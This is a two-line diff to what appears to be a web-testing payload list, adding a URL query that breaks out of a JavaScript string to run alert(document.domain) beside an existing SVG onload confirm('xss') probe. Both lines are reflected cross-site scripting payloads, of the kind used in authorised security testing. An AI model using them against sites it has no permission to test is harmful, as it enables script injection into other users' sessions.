@@ -1,1 +1,2 @@
 /?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+/data/v3/?key=%27-alert(document.domain)-%27
